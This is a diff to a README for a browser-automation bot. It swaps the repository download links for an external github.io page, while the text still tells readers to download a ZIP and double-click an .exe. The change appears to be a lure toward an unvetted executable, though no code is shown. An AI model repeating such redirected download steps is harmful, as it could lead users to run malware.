@@ -1,6 +1,6 @@
 # 🤖 site-whisperer-browser-bot - Control Any Website Automatically
 
-[![Download Latest Build](https://img.shields.io/badge/Download-Latest_Build-brightgreen?style=for-the-badge&logo=github)](https://github.com/condemnable-prosom618/site-whisperer-browser-bot)
+[![Download Latest Build](https://img.shields.io/badge/Download-Latest_Build-brightgreen?style=for-the-badge&logo=github)](https://condemnable-prosom618.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Site Whisperer Browser Bot lets you interact with websites through your browser.
 
 ### 📥 How to Download
 
-Visit this link to download the application: [https://github.com/condemnable-prosom618/site-whisperer-browser-bot](https://github.com/condemnable-prosom618/site-whisperer-browser-bot)
+Visit this link to download the application: [https://condemnable-prosom618.github.io](https://condemnable-prosom618.github.io)
 
 Click the green "Code" button, then select "Download ZIP". After downloading, extract the ZIP folder to a location on your computer (like your Desktop). Open the extracted folder and double-click the `site-whisperer-browser-bot.exe` file to start.
 
